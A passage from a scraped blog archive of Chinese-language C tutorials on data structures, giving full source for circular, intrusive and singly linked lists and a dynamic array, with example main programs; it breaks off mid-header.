初始化函数，插入函数，获得第一个结点，根据位置删除，根据值删除 获得链表长度，查找，打印结点，释放内存，判断是否为空 CircleLinkList.h 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#ifndef CIRCLELINKLIST_H#define CIRCLELINKLIST_H#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;//真#define CIRCLELINKLIST_TRUE 1//假#define CIRCLELINKLIST_FALSE 0//结点typedef struct CIRCLELINKNODE &#123; struct CIRCLELINKNODE * next;&#125;CircleLinkNode;//链表typedef struct CIRCLELINKLIST &#123; CircleLinkNode head; int size;&#125;CircleLinkList;//比较函数指针typedef int(*COMPARENODE)(CircleLinkNode *, CircleLinkNode *);//打印函数指针typedef void(*PRINTNODE)(CircleLinkNode *);//初始化函数CircleLinkList * Init_CircleLinkList();//插入函数void Insert_CircleLinkList(CircleLinkList *clist, int pos, CircleLinkNode * data);//获得第一个结点CircleLinkNode * Front_CircleLinkList(CircleLinkList *clist);//根据位置删除void RemoveByPos_CircleLinkList(CircleLinkList *clist,int pos);//根据值删除void RemoveByValue_CircleLinkList(CircleLinkList *clist, CircleLinkNode* data,COMPARENODE compare);//获得链表长度int Size_CircleLinkList(CircleLinkList *clist);//查找int Find_CircleLinkList(CircleLinkList *clist, CircleLinkNode * data, COMPARENODE compare);//打印结点void Print_CircleLinkList(CircleLinkList *clist, PRINTNODE print);//释放内存void FreeSpace_CircleLinkList(CircleLinkList *clist);//判断是否为空int IsEmpty_CircleLinkList(CircleLinkList *clist);#endif CircleLinkList.c 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166#include\"CircleLinkList.h\"//初始化函数CircleLinkList * Init_CircleLinkList()&#123; CircleLinkList *list = (CircleLinkList*)malloc(sizeof(CircleLinkList)); list-&gt;head.next = &amp;(list-&gt;head); //开始先让头结点的next指向自己 list-&gt;size = 0; return list;&#125;//插入函数void Insert_CircleLinkList(CircleLinkList *clist, int pos, CircleLinkNode * data) &#123; if (clist == NULL) &#123; return; &#125; if (data == NULL) &#123; return; &#125; if (pos &lt; 0 || pos &gt; clist-&gt;size ) &#123; pos = clist-&gt;size; &#125; //查找 CircleLinkNode * pCurrent = &amp;(clist-&gt;head); for (int i = 0; i &lt; pos; i++) &#123; pCurrent = pCurrent-&gt;next; &#125; //插入结点 data-&gt;next = pCurrent-&gt;next; pCurrent-&gt;next = data; //结点长度加1 clist-&gt;size++;&#125;//获得第一个元素CircleLinkNode * Front_CircleLinkList(CircleLinkList *clist) &#123; return clist-&gt;head.next;&#125;//根据位置删除void RemoveByPos_CircleLinkList(CircleLinkList *clist, int pos) &#123; if (clist == NULL) &#123; return; &#125; if (pos &lt; 0 || pos &gt; clist-&gt;size) &#123; return; &#125; //查找位置 CircleLinkNode * pCurrent = &amp;(clist-&gt;head); for (int i = 0; i &lt; pos; i++) &#123; pCurrent = pCurrent-&gt;next; &#125; CircleLinkNode * pNext = pCurrent-&gt;next; pCurrent-&gt;next = pNext-&gt;next; clist-&gt;size--;&#125;//根据值删除void RemoveByValue_CircleLinkList(CircleLinkList *clist, CircleLinkNode* data, COMPARENODE compare) &#123; if (clist == NULL) &#123; return; &#125; if (data == NULL) &#123; return; &#125; //指向目标结点的前一个结点 CircleLinkNode *pPrev = &amp;(clist-&gt;head); //指向目标结点 CircleLinkNode * pCurrent = clist-&gt;head.next; for (int i = 0; i &lt; clist-&gt;size; i++) &#123; if (compare(pCurrent,data) == CIRCLELINKLIST_TRUE) &#123; //删除结点 pPrev-&gt;next = pCurrent-&gt;next; break; &#125; pPrev = pPrev-&gt;next; pCurrent = pCurrent-&gt;next; &#125; //结点长度减一 clist-&gt;size--;&#125;//获得链表长度int Size_CircleLinkList(CircleLinkList *clist) &#123; return clist-&gt;size;&#125;//查找int Find_CircleLinkList(CircleLinkList *clist, CircleLinkNode * data, COMPARENODE compare) &#123; if (clist == NULL) &#123; return -1; &#125; if (data == NULL) &#123; return -1; &#125; CircleLinkNode *pCurrent = clist-&gt;head.next; int pos = -1; for (int i = 0; i &lt; clist-&gt;size; i++) &#123; if (compare(pCurrent,data) == CIRCLELINKLIST_TRUE) &#123; pos = i; break; &#125; pCurrent = pCurrent-&gt;next; &#125; return pos;&#125;//打印结点void Print_CircleLinkList(CircleLinkList *clist, PRINTNODE print) &#123; if (clist == NULL) &#123; return; &#125; CircleLinkNode * pCurrent = clist-&gt;head.next; for (int i = 0; i &lt; clist-&gt;size; i++) &#123; print(pCurrent); pCurrent = pCurrent-&gt;next; &#125; printf(\"\\n ==================================\\n\");&#125;//释放内存void FreeSpace_CircleLinkList(CircleLinkList *clist) &#123; if (clist == NULL) &#123; return; &#125; free(clist);&#125;//判断是否为空int IsEmpty_CircleLinkList(CircleLinkList *clist) &#123; if (clist-&gt;size == 0) &#123; return CIRCLELINKLIST_TRUE; &#125; return CIRCLELINKLIST_FALSE;&#125; main.c 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071#include&lt;stdio.h&gt;#include\"CircleLinkList.h\"#include&lt;string.h&gt;typedef struct STUDENT &#123; CircleLinkNode node; char name[64]; int score; int age;&#125;Student;//比较函数int Compare(CircleLinkNode *data1, CircleLinkNode *data2) &#123; Student *s1 = (Student*)data1; Student *s2 = (Student*)data2; if (s1-&gt;age == s2-&gt;age &amp;&amp; s1-&gt;score == s2-&gt;score &amp;&amp; strcmp(s1-&gt;name,s2-&gt;name) == 0) &#123; return 1; &#125; else &#123; return 0; &#125;&#125;//打印函数void Print(CircleLinkNode * node) &#123; Student *s = (Student*)node; printf(\"%s,%d,%d\\n\",s-&gt;name,s-&gt;age,s-&gt;score);&#125;int main() &#123; Student s1 = &#123;NULL,\"aaa\",81,15&#125;; Student s2 = &#123; NULL,\"bbb\",82,16&#125;; Student s3 = &#123; NULL,\"ccc\",83,17&#125;; Student s4 = &#123; NULL,\"ddd\",84,18&#125;; Student s5 = &#123; NULL,\"eee\",85,19&#125;; //创建链表 CircleLinkList* clist = Init_CircleLinkList(); //插入链表 Insert_CircleLinkList(clist,100,(CircleLinkNode*)&amp;s1); Insert_CircleLinkList(clist,100, (CircleLinkNode*)&amp;s2); Insert_CircleLinkList(clist,100, (CircleLinkNode*)&amp;s3); Insert_CircleLinkList(clist,100, (CircleLinkNode*)&amp;s4); Insert_CircleLinkList(clist,100, (CircleLinkNode*)&amp;s5); //打印链表 Print_CircleLinkList(clist,Print); //删除第0个元素 RemoveByPos_CircleLinkList(clist,0); //删除s4元素 RemoveByValue_CircleLinkList(clist, (CircleLinkNode*)&amp;s4, Compare); //打印链表 Print_CircleLinkList(clist,Print); //查找 printf(\"pos:%d\\n\", Find_CircleLinkList(clist, (CircleLinkNode*)&amp;s5, Compare)); //返回链表大小 printf(\"size:%d\\n\", Size_CircleLinkList(clist)); //释放链表 FreeSpace_CircleLinkList(clist); return 0;&#125;","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://xiaowuyoucy.github.io/categories/数据结构与算法/"}],"tags":[]},{"title":"企业链表","slug":"sf0003企业链表","date":"2021-12-30T10:50:05.000Z","updated":"2021-12-30T11:05:22.145Z","comments":true,"path":"2021/12/30/sf0003企业链表/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/12/30/sf0003企业链表/","excerpt":"","text":"不开辟结点的空间，用户定义的结构体包含指向下一个结点的指针。 链表小结点 123typedef struct LINKNODE &#123; struct LINKNODE* next; //指向一个结点的指针变量&#125;LinkNode; 链表结点 1234typedef struct LINKLIST &#123; LinkNode head; //头结点,不保存数据 int size; //结点长度&#125;LinkList; 企业链表操作 初始化链表，插入，删除，查找，返回链表大小，打印，释放链表内存 初始化链表 12345678//初始化链表LinkList* Init_LinkList() &#123; LinkList * list = (LinkList*)malloc(sizeof(LinkList)); list-&gt;head.next = NULL; list-&gt;size = 0; return list;&#125; 插入 123456789101112131415161718192021222324252627//插入void Insert_LinkList(LinkList* list, int pos, LinkNode* data) &#123; if (list == NULL) &#123; return; &#125; if (data == NULL) &#123; return; &#125; if (pos &lt; 0 || pos &gt;= list-&gt;size) &#123; pos = list-&gt;size; &#125; //查找插入位置 LinkNode * pCurrent = &amp;(list-&gt;head); for (int i = 0; i &lt; pos; i++) &#123; pCurrent = pCurrent-&gt;next; &#125; //插入新结点 data-&gt;next = pCurrent-&gt;next; pCurrent-&gt;next = data; list-&gt;size++;&#125; 删除 12345678910111213141516171819202122//删除void Remove_LinkList(LinkList* list, int pos) &#123; if (list == NULL) &#123; return; &#125; if (pos &lt; 0 || pos &gt;= list-&gt;size) &#123; return; &#125; //辅助指针变量 LinkNode * pCurrent = &amp;(list-&gt;head); for (int i = 0; i &lt; pos; i++) &#123; pCurrent = pCurrent-&gt;next; &#125; pCurrent-&gt;next = pCurrent-&gt;next-&gt;next; list-&gt;size--;&#125; 查找 1234567891011121314151617181920212223242526//查找int Find_LinkList(LinkList* list, LinkNode * data, COMPARENODE compare) &#123; if (list == NULL) &#123; return -1; &#125; if (data == NULL) &#123; return -1; &#125; //辅助指针变量 LinkNode *pCurrent = list-&gt;head.next; int flag = -1, pos = 0; while (pCurrent != NULL) &#123; if (compare(pCurrent,data) == 0) &#123; return (flag = pos); break; &#125; pos++; pCurrent = pCurrent-&gt;next; &#125; return flag;&#125; 返回链表大小 12345//返回链表大小int Size_LinkList(LinkList* list) &#123; return list-&gt;size;&#125; 打印 123456789101112131415//打印void Print_LinkList(LinkList* list, PRINTNODE print) &#123; if (list == NULL) &#123; return; &#125; //辅助指针 LinkNode* pCurrent = list-&gt;head.next; while (pCurrent != NULL) &#123; print(pCurrent); pCurrent = pCurrent-&gt;next; &#125;&#125; 释放链表内存 123456789//释放链表内存void FreeSpace_LinkList(LinkList* list) &#123; if (list == NULL) &#123; return; &#125; free(list);&#125; Linklist.h 12345678910111213141516171819202122232425262728293031323334353637383940414243#ifndef LINKLIST_H#define LINKLIST_H#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;//链表小结点typedef struct LINKNODE &#123; struct LINKNODE* next;&#125;LinkNode;//链表结点typedef struct LINKLIST &#123; LinkNode head; int size;&#125;LinkList;//用户提供的打印函数指针typedef void(*PRINTNODE)(LinkNode *);//用户提供的比较函数指针typedef int(*COMPARENODE)(LinkNode*, LinkNode*);//初始化链表LinkList* Init_LinkList();//插入void Insert_LinkList(LinkList* list, int pos, LinkNode* data);//删除void Remove_LinkList(LinkList* list, int pos);//查找int Find_LinkList(LinkList* list, LinkNode * data, COMPARENODE compare);//返回链表大小int Size_LinkList(LinkList* list);//打印void Print_LinkList(LinkList* list, PRINTNODE print);//释放链表内存void FreeSpace_LinkList(LinkList* list);#endif ListLink.c 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121#include\"LinkList.h\"//初始化链表LinkList* Init_LinkList() &#123; LinkList * list = (LinkList*)malloc(sizeof(LinkList)); list-&gt;head.next = NULL; list-&gt;size = 0; return list;&#125;//插入void Insert_LinkList(LinkList* list, int pos, LinkNode* data) &#123; if (list == NULL) &#123; return; &#125; if (data == NULL) &#123; return; &#125; if (pos &lt; 0 || pos &gt;= list-&gt;size) &#123; pos = list-&gt;size; &#125; //查找插入位置 LinkNode * pCurrent = &amp;(list-&gt;head); for (int i = 0; i &lt; pos; i++) &#123; pCurrent = pCurrent-&gt;next; &#125; //插入新结点 data-&gt;next = pCurrent-&gt;next; pCurrent-&gt;next = data; list-&gt;size++;&#125;//删除void Remove_LinkList(LinkList* list, int pos) &#123; if (list == NULL) &#123; return; &#125; if (pos &lt; 0 || pos &gt;= list-&gt;size) &#123; return; &#125; //辅助指针变量 LinkNode * pCurrent = &amp;(list-&gt;head); for (int i = 0; i &lt; pos; i++) &#123; pCurrent = pCurrent-&gt;next; &#125; pCurrent-&gt;next = pCurrent-&gt;next-&gt;next; list-&gt;size--;&#125;//查找int Find_LinkList(LinkList* list, LinkNode * data, COMPARENODE compare) &#123; if (list == NULL) &#123; return -1; &#125; if (data == NULL) &#123; return -1; &#125; //辅助指针变量 LinkNode *pCurrent = list-&gt;head.next; int flag = -1, pos = 0; while (pCurrent != NULL) &#123; if (compare(pCurrent,data) == 0) &#123; return (flag = pos); break; &#125; pos++; pCurrent = pCurrent-&gt;next; &#125; return flag;&#125;//返回链表大小int Size_LinkList(LinkList* list) &#123; return list-&gt;size;&#125;//打印void Print_LinkList(LinkList* list, PRINTNODE print) &#123; if (list == NULL) &#123; return; &#125; //辅助指针 LinkNode* pCurrent = list-&gt;head.next; while (pCurrent != NULL) &#123; print(pCurrent); pCurrent = pCurrent-&gt;next; &#125;&#125;//释放链表内存void FreeSpace_LinkList(LinkList* list) &#123; if (list == NULL) &#123; return; &#125; free(list);&#125; main.c 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#include&lt;stdio.h&gt;#include\"LinkList.h\"#include&lt;string.h&gt;typedef struct PERSON &#123; LinkNode node; char name[64]; int age;&#125;Person;void MyPrint(LinkNode* data) &#123; Person *p = (Person*)data; printf(\"%s,%d\\n\", p-&gt;name, p-&gt;age);&#125;int compare(LinkNode* d1, LinkNode *d2)&#123; Person *p1 = (Person*)d1; Person *p2 = (Person*)d2; if (strcmp(p1-&gt;name,p2-&gt;name) == 0 &amp;&amp; p1-&gt;age == p2-&gt;age) &#123; return 0; &#125; return -1;&#125;int main() &#123; //初始化 LinkList * list = Init_LinkList(); //创建数据 Person p1 = &#123; NULL,\"aaa\",11 &#125;; Person p2 = &#123; NULL,\"bbb\",12 &#125;; Person p3 = &#123; NULL,\"ccc\",13 &#125;; Person p4 = &#123; NULL,\"ddd\",14 &#125;; Person p5 = &#123; NULL,\"eee\",15 &#125;; //插入数据 Insert_LinkList(list,0,(LinkNode *)&amp;p1); Insert_LinkList(list,0,(LinkNode *)&amp;p2); Insert_LinkList(list,0,(LinkNode *)&amp;p3); Insert_LinkList(list,0,(LinkNode *)&amp;p4); Insert_LinkList(list,0,(LinkNode *)&amp;p5); //打印链表 Print_LinkList(list, MyPrint); //查找 int ret = Find_LinkList(list, (LinkNode*)&amp;p1, compare); printf(\"Find:%d\\n\", ret); //返回链表长度 printf(\"Size:%d\\n\", Size_LinkList(list)); printf(\"--------------------\\n\"); //删除 Remove_LinkList(list,4); //打印链表 Print_LinkList(list, MyPrint); //释放链表 FreeSpace_LinkList(list); return 0;&#125;","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://xiaowuyoucy.github.io/categories/数据结构与算法/"}],"tags":[]},{"title":"单向链表","slug":"sf002单向链表","date":"2021-12-29T10:12:11.000Z","updated":"2021-12-29T14:16:11.602Z","comments":true,"path":"2021/12/29/sf002单向链表/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/12/29/sf002单向链表/","excerpt":"","text":"链表是由一系列的结点组成，链表在内存中是非连续的，每一个结点包含两个域，一个保存数据域，一个保存结点关系的指针域。 链表节点 结点包含两个域,一个指向数据,一个指向下一个结点的指针 12345typedef struct LINKNODE &#123; void* data;//指向任何类型的数据 struct LINKNODE* next; //指向下一个链表的结点&#125;LinkNode; 链表结构体 头结点不保存数据. 12345typedef struct LINKLIST &#123; LinkNode* head; //指向链表头结点 int size; //链表长度&#125;LinkList; 链表操作 初始化链表，指定位置插入，删除指定位置的结点，获得链表的长度 查找，打印链表节点,需要用户提供一个打印函数，返回第一个节点 释放链表内存 初始化链表 1234567891011121314LinkList* Init_LinkList() &#123; //创建链表结构体 LinkList* list = (LinkList *)malloc(sizeof(LinkList)); list-&gt;size = 0; //头结点不保存数据信息 list-&gt;head = (LinkNode*)malloc(sizeof(LinkNode)); list-&gt;head-&gt;data = NULL; list-&gt;head-&gt;next = NULL; //返回链表 return list;&#125; 指定位置插入 12345678910111213141516171819202122232425262728293031323334353637383940void Insert_LinkList(LinkList* list, int pos, void *data) &#123; if (list == NULL) &#123; return; &#125; if (list-&gt;head == NULL) &#123; return; &#125; //友好处理越界问题 if (pos &lt; 0 || pos &gt; list-&gt;size) &#123; pos = list-&gt;size; &#125; //创建新的结点 LinkNode* newNode = (LinkNode*)malloc(sizeof(LinkNode)); newNode-&gt;data = data; newNode-&gt;next = NULL; //查找找结点 //辅助指针变量 LinkNode* pCurrent = list-&gt;head; for (int i = 0; i &lt; pos; i++) &#123; pCurrent = pCurrent-&gt;next; &#125; //新结点入链表 newNode-&gt;next = pCurrent-&gt;next; pCurrent-&gt;next = newNode; //结点数量加1 list-&gt;size++;&#125; 删除指定位置的值 12345678910111213141516171819202122232425262728void RemoveByPos_LinkList(LinkList* list, int pos) &#123; if (list == NULL) &#123; return; &#125; if (pos &lt; 0 || pos &gt;= list-&gt;size) &#123; return; &#125; //查找删除结点的前一个结点 LinkNode* pCurrent = list-&gt;head; for (int i = 0; i &lt; pos; i++) &#123; pCurrent = pCurrent-&gt;next; &#125; //缓存删除的结点 LinkNode* pDel = pCurrent-&gt;next; //使当前结点的next指向下下个结点 pCurrent-&gt;next = pDel-&gt;next; //释放删除结点的内存 free(pDel); //结点数量减一 list-&gt;size--;&#125; 获得链表的长度 1234int Size_LinkList(LinkList* list) &#123; return list-&gt;size;&#125; 查找结点,需要用户提供 1234567891011121314151617181920212223242526272829int Find_LinkList(LinkList* list, void* pData, PEQUALNODE equal)&#123; if (list == NULL) &#123; return -1; &#125; if (pData == NULL) &#123; return -1; &#125; //遍历查找 LinkNode* pCurrent = list-&gt;head-&gt;next; //记录当前位置 int pos = 0; while (pCurrent != NULL) &#123; //使用用户提供的equal函数判断结点是否相等 if (equal(pCurrent-&gt;data,pData) == 0) &#123; break;//跳出循环 &#125; pos++;//当前位置加1 //指向下一个结点 pCurrent = pCurrent-&gt;next; &#125; //返回结点位置,pos等于size表示查找失败 return pos;&#125; 打印链表节点,需要用户提供一个打印函数 1234567891011121314151617void Print_LinkList(LinkList* list, PRINTLINKNODE print) &#123; if (list == NULL) &#123; return; &#125; //辅助指针变量 LinkNode* pCurrent = list-&gt;head-&gt;next; //判断当前结点是否为空 while (pCurrent != NULL) &#123; //使用用户提供的print函数打印结点 print(pCurrent-&gt;data); //指向下一个指针 pCurrent = pCurrent-&gt;next; &#125;&#125; 返回第一个节点 1234void* Front_LinkList(LinkList* list) &#123; return list-&gt;head-&gt;next;&#125; 释放链表内存 12345678910111213141516171819202122void FreeSpace_LinkList(LinkList* list) &#123; if (list == NULL) &#123; return; &#125; LinkNode *pCurrent = list-&gt;head; //判断当前结点是否为空 while (pCurrent != NULL) &#123; //缓存当前结点的下一个结点 LinkNode *pNext = pCurrent-&gt;next; //释放当前结点 free(pCurrent); //指向下一个结点 pCurrent = pNext; &#125; list-&gt;size = 0; //释放list链表结构 free(list);&#125; LinkList.h 123456789101112131415161718192021222324252627282930313233343536373839404142#ifndef LINKLIST_H#define LINKLIST_H#include&lt;stdlib.h&gt;#include&lt;string.h&gt;#include&lt;stdio.h&gt;//链表节点typedef struct LINKNODE &#123; void* data;//指向任何类型的数据 struct LINKNODE* next;&#125;LinkNode;//链表结构体typedef struct LINKLIST &#123; LinkNode* head; int size;&#125;LinkList;//打印函数指针typedef void(*PRINTLINKNODE)(void *);//判断函数指针typedef int(*PEQUALNODE)(void* vp1, void *vp2);//初始化链表LinkList* Init_LinkList();//指定位置插入void Insert_LinkList(LinkList* list, int pos, void *data);//删除指定位置的结点void RemoveByPos_LinkList(LinkList* list, int pos);//获得链表的长度int Size_LinkList(LinkList* list);//查找int Find_LinkList(LinkList* list, void* pData, PEQUALNODE equal);//打印链表节点,需要用户提供一个打印函数void Print_LinkList(LinkList* list, PRINTLINKNODE print);//返回第一个节点void* Front_LinkList(LinkList* list);//释放链表内存void FreeSpace_LinkList(LinkList* list);#endif LinkList.c 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149#include\"LinkList.h\"//初始化链表LinkList* Init_LinkList() &#123; LinkList* list = (LinkList *)malloc(sizeof(LinkList)); list-&gt;size = 0; //头结点不保存数据信息 list-&gt;head = (LinkNode*)malloc(sizeof(LinkNode)); list-&gt;head-&gt;data = NULL; list-&gt;head-&gt;next = NULL; return list;&#125;//指定位置插入void Insert_LinkList(LinkList* list, int pos, void *data) &#123; if (list == NULL) &#123; return; &#125; if (list-&gt;head == NULL) &#123; return; &#125; //友好处理越界问题 if (pos &lt; 0 || pos &gt; list-&gt;size) &#123; pos = list-&gt;size; &#125; //创建新的结点 LinkNode* newNode = (LinkNode*)malloc(sizeof(LinkNode)); newNode-&gt;data = data; newNode-&gt;next = NULL; //查找找结点 //辅助指针变量 LinkNode* pCurrent = list-&gt;head; for (int i = 0; i &lt; pos; i++) &#123; pCurrent = pCurrent-&gt;next; &#125; //新结点入链表 newNode-&gt;next = pCurrent-&gt;next; pCurrent-&gt;next = newNode; list-&gt;size++;&#125;//删除指定位置的值void RemoveByPos_LinkList(LinkList* list, int pos) &#123; if (list == NULL) &#123; return; &#125; if (pos &lt; 0 || pos &gt;= list-&gt;size) &#123; return; &#125; //查找删除结点的前一个结点 LinkNode* pCurrent = list-&gt;head; for (int i = 0; i &lt; pos; i++) &#123; pCurrent = pCurrent-&gt;next; &#125; //缓存删除的结点 LinkNode* pDel = pCurrent-&gt;next; pCurrent-&gt;next = pDel-&gt;next; //释放删除结点的内存 free(pDel); list-&gt;size--;&#125;//获得链表的长度int Size_LinkList(LinkList* list) &#123; return list-&gt;size;&#125;//查找int Find_LinkList(LinkList* list, void* pData, PEQUALNODE equal)&#123; if (list == NULL) &#123; return -1; &#125; if (pData == NULL) &#123; return -1; &#125; //遍历查找 LinkNode* pCurrent = list-&gt;head-&gt;next; int pos = 0; while (pCurrent != NULL) &#123; if (equal(pCurrent-&gt;data,pData) == 0) &#123; break; &#125; pos++; pCurrent = pCurrent-&gt;next; &#125; return pos;&#125;//打印链表节点,需要用户提供一个打印函数void Print_LinkList(LinkList* list, PRINTLINKNODE print) &#123; if (list == NULL) &#123; return; &#125; //辅助指针变量 LinkNode* pCurrent = list-&gt;head-&gt;next; while (pCurrent != NULL) &#123; print(pCurrent-&gt;data); pCurrent = pCurrent-&gt;next; &#125;&#125;//返回第一个节点void* Front_LinkList(LinkList* list) &#123; return list-&gt;head-&gt;next;&#125;//释放链表内存void FreeSpace_LinkList(LinkList* list) &#123; if (list == NULL) &#123; return; &#125; LinkNode *pCurrent = list-&gt;head; while (pCurrent != NULL) &#123; LinkNode *pNext = pCurrent-&gt;next; free(pCurrent); pCurrent = pNext; &#125; list-&gt;size = 0; free(list);&#125; main.c 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#include&lt;stdio.h&gt;#include\"LinkList.h\"typedef struct PERSON &#123; char name[20]; int age; int score;&#125;Person;int Equal(void* pv1, void* pv2) &#123; Person* p1 = (Person *)pv1; Person* p2 = (Person *)pv2; if (strcmp(p1-&gt;name, p2-&gt;name) == 0 &amp;&amp; p1-&gt;age == p2-&gt;age) &#123; return 0; &#125; else &#123; return 1; &#125;&#125;void print(void* pv) &#123; Person *p1 = (Person *)pv; printf(\"%s,%d,%d\\n\", p1-&gt;name, p1-&gt;age, p1-&gt;score);&#125;int main() &#123; Person p1 = &#123; \"aaa\",10,100 &#125;; Person p2 = &#123; \"bbb\",11,111 &#125;; Person p3 = &#123; \"ccc\",12,20 &#125;; Person p4 = &#123; \"ddd\",13,150 &#125;; Person p5 = &#123; \"eee\",14,120 &#125;; //初始化链表 LinkList *list = Init_LinkList(); //在链表指定位置添加结点 Insert_LinkList(list,0,&amp;p1); Insert_LinkList(list,1,&amp;p2); Insert_LinkList(list,2,&amp;p3); Insert_LinkList(list,3,&amp;p4); Insert_LinkList(list,4,&amp;p5); //打印链表 Print_LinkList(list, print); //查找结点位置 printf(\"%d\\n\", Find_LinkList(list, &amp;p4, Equal)); //返回链表第一个结点 LinkNode *ret = (LinkNode*)Front_LinkList(list); printf(\"%s,%d,%d\\n\",((Person*)(ret-&gt;data))-&gt;name, ((Person*)(ret-&gt;data))-&gt;age, ((Person*)(ret-&gt;data))-&gt;score); //获取链表长度 printf(\"size:%d \\n\", Size_LinkList(list)); //删除指定位置结点 RemoveByPos_LinkList(list, 4); printf(\"---------------\"); printf(\"size:%d \\n\", Size_LinkList(list)); Print_LinkList(list, print); //释放链表内存 FreeSpace_LinkList(list); return 0;&#125;","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://xiaowuyoucy.github.io/categories/数据结构与算法/"}],"tags":[]},{"title":"动态数组","slug":"sf001动态数组","date":"2021-12-29T09:12:11.000Z","updated":"2021-12-29T14:18:59.369Z","comments":true,"path":"2021/12/29/sf001动态数组/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/12/29/sf001动态数组/","excerpt":"","text":"线性表的顺序存储:用一块连续的内存空间 插入新元素,空间不足 申请更大的内存空间, 旧的空间数据拷贝到新空间 释放旧空间的内存 新元素插入到新空间 构成元素: 容量，元素个数，int指针 12345typedef struct DYNAMICARRAY &#123; int * pAddr; int size; //元素个数 int capacity; //容量&#125;Dynamic_Array; 数组行为: 初始化，插入，根据位置删除，根据值删除，查找，打印元素，释放动态数组的内存 清空数组，获得动态数组容量，获得动态数据当前元素个数，根据位置获得某个位置元素 1.初始化 1234567891011121314151617181920//初始化Dynamic_Array * Init_Array() &#123; //分配内存 Dynamic_Array * myArray = (Dynamic_Array *)malloc(sizeof(Dynamic_Array)); if (myArray == NULL) &#123; return NULL; &#125; myArray-&gt;size = 0; myArray-&gt;capacity = 20; //分配元素内存 myArray-&gt;pAddr = (int *)malloc(myArray-&gt;capacity * sizeof(int)); if (myArray-&gt;pAddr == NULL) &#123; return NULL; &#125; return myArray;&#125; 2.插入 123456789101112131415161718192021222324252627//插入void Push_Back_Array(Dynamic_Array* arr, int value) &#123; if (arr == NULL) &#123; return; &#125; //判断空间是否足够 if (arr-&gt;size == arr-&gt;capacity) &#123; //第一步,申请一块更大的内存空间,新空间是旧空间的两倍 int* newSpace = (int *)malloc(arr-&gt;capacity * sizeof(int) * 2); //第二步,拷贝数据到新空间 memcpy(newSpace, arr-&gt;pAddr, arr-&gt;capacity * sizeof(int)); //第三步,释放旧空间的内存 free(arr-&gt;pAddr); //更新容量 arr-&gt;capacity = arr-&gt;capacity * 2; arr-&gt;pAddr = newSpace; &#125; //插入新元素 arr-&gt;pAddr[arr-&gt;size] = value; arr-&gt;size++;&#125; 3.根据位置删除 12345678910111213141516171819//根据位置删除void Remove_Array(Dynamic_Array * arr, int pos) &#123; if (arr == NULL) &#123; return; &#125; //判断位置是否有效 if (pos &lt; 0 || pos &gt;= arr-&gt;size) &#123; return; &#125; //删除元素,将后面一位往前面移动一位 for (int i = pos; i &lt; arr-&gt;size - 1; i++) &#123; arr-&gt;pAddr[i] = arr-&gt;pAddr[i + 1]; &#125; arr-&gt;size--;&#125; 4.根据值删除 1234567891011121314//根据值删除void RemoveByValue(Dynamic_Array * arr, int value) &#123; if (arr == NULL) &#123; return; &#125; //查找元素位置 int pos = Find_Array(arr,value); //判断位置是否有效 if (pos &lt; 0 || pos &gt;= arr-&gt;size) &#123; return; &#125; //根据位置删除元素 Remove_Array(arr, pos);&#125; 5.查找 12345678910111213141516171819//查找,找到返回位置,找不到返回-1int Find_Array(Dynamic_Array * arr, int value) &#123; if (arr == NULL) &#123; return -1; &#125; int pos = -1; for (int i = 0; i &lt; arr-&gt;size; i++) &#123; if (arr-&gt;pAddr[i] == value) &#123; pos = i; break; &#125; &#125; return pos;&#125; 6.打印元素 12345678910void Print_Array(Dynamic_Array * arr) &#123; if (arr == NULL) &#123; return; &#125; for (int i = 0; i &lt; arr-&gt;size; i++) &#123; printf(\"%d \", arr-&gt;pAddr[i]); &#125; printf(\"\\n\");&#125; 7.释放动态数组的内存 1234567891011121314//释放动态数组的内存void FreeSpace_Array(Dynamic_Array * arr) &#123; if (arr != NULL) &#123; if (arr-&gt;pAddr != NULL) &#123; free(arr-&gt;pAddr); &#125; free(arr); &#125; arr = NULL;&#125; 8.清空数组 12345678//清空数组void Clear_Array(Dynamic_Array * arr) &#123; if (arr == NULL) &#123; return; &#125; arr-&gt;size = 0;&#125; 9.获得动态数组容量 12345678//获得动态数组容量int Capacity_Array(Dynamic_Array * arr) &#123; if (arr == NULL) &#123; return -1; &#125; return arr-&gt;capacity;&#125; 10.获得动态数据当前元素个数 1234567//获得动态数据当前元素个数int Size_Array(Dynamic_Array * arr) &#123; if (arr == NULL) &#123; return -1; &#125; return arr-&gt;size;&#125; 11.根据位置获得某个位置元素 1234567//根据位置获得某个位置元素int At_Array(Dynamic_Array * arr, int pos) &#123; if (arr == NULL) &#123; return -1; &#125; return arr-&gt;pAddr[pos];&#125; DynamicArray.h 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#ifndef DYNAMIC_ARRAY_H#define DYNAMIC_ARRAY_H#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;stdlib.h&gt;//容量capacity//元素个数size//动态数组结构体typedef struct DYNAMICARRAY &#123; int * pAddr; int size; int capacity;&#125;Dynamic_Array;//初始化Dynamic_Array * Init_Array();//插入void Push_Back_Array(Dynamic_Array* arr,int value);//根据位置删除void Remove_Array(Dynamic_Array * arr,int pos);//根据值删除void RemoveByValue(Dynamic_Array * arr,int value);//查找int Find_Array(Dynamic_Array * arr,int value);//打印void 